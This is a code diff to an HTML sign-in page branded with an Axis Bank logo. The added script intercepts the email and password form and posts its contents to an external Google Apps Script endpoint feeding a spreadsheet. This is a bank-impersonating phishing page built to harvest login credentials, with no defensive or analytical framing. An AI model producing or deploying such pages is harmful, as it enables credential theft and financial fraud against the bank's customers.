@@ -16,11 +16,22 @@
                 <img src="logo.png" alt="Axis Bank Logo">
             </div>
             <h2>Sign in</h2>
-            <form action="#" method="post">
+            <form name='submit-to-google-sheet' action="/" method="post">
                 <input type="email" placeholder="someone@example.com" required>
                 <input type="password" placeholder="Password" required>
                 <button type="submit">Sign in</button>
             </form>
+            <script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbxWVPGPUOJuiyPoyvQquULpRs9j0EXwZurKMoZKwarkx3BXSxgSc5Mn0TXIc-8cwjxe2Q/exec'
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
         </div>
     </div>
 </body>
